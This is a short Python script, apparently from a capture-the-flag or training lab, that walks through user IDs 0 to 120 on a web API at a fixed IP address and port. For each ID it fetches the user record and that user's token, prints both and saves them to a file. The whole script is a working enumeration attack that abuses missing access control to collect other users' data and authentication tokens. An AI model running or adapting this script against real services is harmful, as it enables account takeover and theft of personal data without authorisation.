import requests

USER_API = "http://94.237.59.206:40942/api.php/user/"
TOKEN_API = "http://94.237.59.206:40942/api.php/token/"

with open('output.json', 'a') as file:
    for i in range(0, 121):
        string_i = str(i)
        
        response_users = requests.get(USER_API + string_i)
        response_tokens = requests.get(TOKEN_API + string_i)
        
        if response_users.status_code == 200 and response_users.text != "":
            print(response_users.text)
            print(response_tokens.text)
            print("\n")
            file.write(response_users.text)
            file.write(response_tokens.text)
